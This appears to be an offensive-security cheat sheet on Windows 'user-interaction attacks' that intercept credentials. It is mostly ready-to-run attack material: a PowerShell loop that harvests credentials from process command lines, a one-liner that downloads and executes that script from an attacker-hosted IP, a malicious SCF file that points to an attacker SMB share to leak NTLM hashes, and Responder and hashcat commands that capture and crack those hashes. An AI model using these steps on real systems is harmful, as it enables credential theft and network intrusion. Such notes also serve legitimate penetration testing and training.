---
description: >-
  Here we would talk about some nice-n-easy techniques which requires
  interaction with meatbags like million types of intercepting creds :3
---

# User-Interaction Attacks

## <mark style="color:yellow;">**Monitoring for Process Command Lines**</mark>

There may be scheduled tasks or other processes being executed which pass credentials on the command line. We can look for process command lines using something like this script below. It captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.

```powershell
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

Then we are hosting script in out machine at looking at the magic

```powershell
PS C:\> IEX (iwr 'http://13.13.13.13/procmon.ps1') 
```

## <mark style="color:yellow;">Malicious SCF file</mark>

An SCF file is a Windows Explorer shortcut used to execute commands. For intercepting hashes:

```bash
[Shell]
Command=2
IconFile=\\13.13.13.13\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

And then for our good-old-middleman Responder

```bash
sudo responder -I eth0
```

```sh
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```
